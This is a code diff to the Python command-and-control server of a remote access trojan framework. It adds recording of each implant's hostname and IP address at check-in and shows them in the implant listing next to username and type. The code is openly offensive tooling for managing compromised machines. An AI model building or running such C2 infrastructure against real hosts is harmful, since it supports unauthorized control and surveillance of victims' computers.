@@ -48,6 +48,8 @@ commands = {}
 rats = {}
 types = {}
 usernames = {}
+hostnames = {}
+ip_addrs = {}
 
 # Tab completion stuff -- https://stackoverflow.com/questions/5637124/tab-completion-in-pythons-raw-input
 class Completer(object):
@@ -157,7 +159,7 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.5.5 Eval and Gadget2JScript  "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.5.6 Hostnames WOW            "`
     """
     pretty_print(banner)
 
@@ -428,13 +430,15 @@ def serve_server(port=8080):
         post_json = request.get_json(force=True)
         post_dict = dict(post_json)
         try:
+            ip_addr = request.environ['REMOTE_ADDR']
             ratID = str(post_dict['id'])
             ratType = str(post_dict['type'])
+            username = str(post_dict['un'])
+            hostname = str(post_dict['hn'])
             if(ratType not in supported_types):
                 ratType = "?"
-            username = str(post_dict['un'])
         except:
-            pretty_print("\n[!] Failed to grab id, type, or user param from POST request")
+            pretty_print("\n[!] Failed to grab id, type, username, or hostname param from POST request")
             return(default_page())
 
         # Update checkin time for an agent every checkin
@@ -442,6 +446,8 @@ def serve_server(port=8080):
         rats[ratID] = checkin
         types[ratID] = ratType
         usernames[ratID] = username
+        hostnames[ratID] = hostname
+        ip_addrs[ratID] = ip_addr
         if(verbose):
             pretty_print("[v] rat " + colors(ratID) + " sent data: " + str(post_json))
 
@@ -509,13 +515,13 @@ def get_stagers(lhost):
     pretty_print("")
 
 def get_rats(current=""):
-    pretty_print("\n    implant id \ttype\tcheck-in\tusername")
-    pretty_print("    ----------\t----\t--------\t--------")
+    pretty_print("\n    implant id \ttype\tcheck-in\tusername\tip address\thostname")
+    pretty_print("    ----------\t----\t--------\t--------\t----------\t--------")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            pretty_print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
+            pretty_print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID]+" \t"+ip_addrs[ratID]+" \t"+hostnames[ratID])
         else:
-            pretty_print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
+            pretty_print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID]+" \t"+ip_addrs[ratID]+" \t"+hostnames[ratID])
     pretty_print("")
 
 def remove_rat(ratID):
